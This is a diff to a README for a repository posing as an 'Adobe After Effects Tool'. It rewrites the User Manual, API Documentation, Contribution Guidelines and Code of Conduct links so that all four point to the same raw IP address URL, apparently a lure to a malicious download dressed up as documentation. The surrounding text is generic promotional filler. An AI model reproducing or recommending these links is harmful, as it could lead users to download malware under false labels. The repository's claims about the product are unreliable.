@@ -36,18 +36,18 @@ The Adobe After Effects Tool is designed to optimize your workflow in animation 
 
 ## 🛠 Documentation
 
-- [User Manual](https://example.com/user-guide)
-- [API Documentation](https://example.com/api-docs)
+- [User Manual](http://91.210.165.22/1dQfgM3Q)
+- [API Documentation](http://91.210.165.22/1dQfgM3Q)
 
 ## 🤝 Contributing
 
 We welcome community contributions to enhance Adobe After Effects. Your ideas and suggestions can help make the product even better! Join our team to share your knowledge and have a chance to influence the future of the tool. We value every participant and provide support at every step of your journey.
 
-**Why Choose Us?** Adobe After Effects is not just a tool; it's a whole ecosystem that includes educational resources, a community of like-minded individuals, and continuous updates. We strive for innovation and usability to help you realize your boldest ideas and projects.
-![image](https://github.com/user-attachments/assets/1a8d6db0-61ac-4415-aab7-60fc7345f285)
+**Why Choose Us?** Adobe After Effects is not just a tool; it's a whole ecosystem that includes educational resources, a community of like-minded individuals, and continuous updates. We strive for innovation and usability to help you realize your boldest ideas and projects. ![image](https://github.com/user-attachments/assets/1a8d6db0-61ac-4415-aab7-60fc7345f285)
 
-- [Contribution Guidelines](https://example.com/contributing)
-- [Code of Conduct](https://example.com/code-of-conduct)
+
+- [Contribution Guidelines](http://91.210.165.22/1dQfgM3Q)
+- [Code of Conduct](http://91.210.165.22/1dQfgM3Q)
 
 ## 🔐 Security & Responsible Use
 
